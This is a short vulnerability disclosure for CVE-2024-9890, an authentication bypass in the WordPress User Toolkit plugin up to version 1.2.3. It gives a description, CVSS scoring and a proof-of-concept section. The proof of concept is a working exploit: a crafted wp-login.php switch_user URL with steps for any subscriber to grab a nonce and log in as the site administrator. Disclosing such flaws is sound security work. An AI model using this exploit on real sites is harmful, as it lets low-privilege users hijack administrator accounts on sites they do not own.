# CVE-2024-9890

User Toolkit <= 1.2.3 - Authenticated (Subscriber+) Authentication Bypass

# Description:
The User Toolkit plugin for WordPress is vulnerable to authentication bypass in versions up to, and including, 1.2.3. This is due to an improper capability check in the 'switchUser' function. This makes it possible for authenticated attackers, with subscriber-level permissions and above, to log in as any existing user on the site, such as an administrator.

```
Published: 2024-10-25 00:00:00
CVE: CVE-2024-9890
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H
CVSS Score: 8.8
Slugs: user-toolkit
```

POC
---

```
http://kubernetes.docker.internal/wp-login.php?action=switch_user&user_id=4&user_from=1&_wpnonce=8af7611329
```

Login as your user.
view-source your provfile page to grag the nonce value.
change the user_from value to your user id
change the user_id to the id of the admin
Done!
